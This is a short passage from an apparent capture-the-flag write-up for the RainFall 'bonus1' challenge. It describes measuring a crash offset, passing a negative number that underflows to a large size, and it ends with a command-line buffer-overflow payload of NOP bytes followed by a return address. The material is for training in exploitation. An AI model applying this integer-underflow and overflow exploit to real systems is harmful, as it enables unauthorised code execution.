...
_we fill the buffer with characters until he crash. it crash at oooo, so 14th letter in our sequence. so 14 * 4 = 56_

_now we need to find a negativ number who can underflow and giving us a positiv number_
...
_we can create a payload_
```
  $> bonus1@RainFall:~$ ./bonus1 -1073741809 $(python -c "print '\x90' * 56 + '\x82\x84\x04\x08'")
